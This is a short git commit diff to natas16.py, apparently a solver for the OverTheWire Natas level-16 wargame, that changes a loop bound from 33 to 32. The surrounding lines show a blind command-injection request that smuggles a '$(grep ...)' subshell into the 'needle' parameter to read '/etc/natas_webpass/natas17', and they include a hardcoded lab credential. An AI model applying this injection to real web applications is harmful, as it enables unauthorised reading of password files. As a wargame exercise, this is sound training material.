edf5944d04680ee157e2024d1794b0a2d2f40ae7
icemindd <55721808+icemindd@users.noreply.github.com>
2019-09-24 03:24:10 +0300

    Update natas16.py

--- natas16.py
+++ natas16.py
@@ -7,7 +7,7 @@ all = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
 j = ''
 print(' Finding the password...')
 
-while len(j) < 33:
+while len(j) < 32:
     for i in all:
         r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=%24%28grep+^' + j + i + '+%2Fetc2Fnatas_webpass%2Fnatas17%29&submit=Search', auth = HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
         if len(r.content) < 461983:
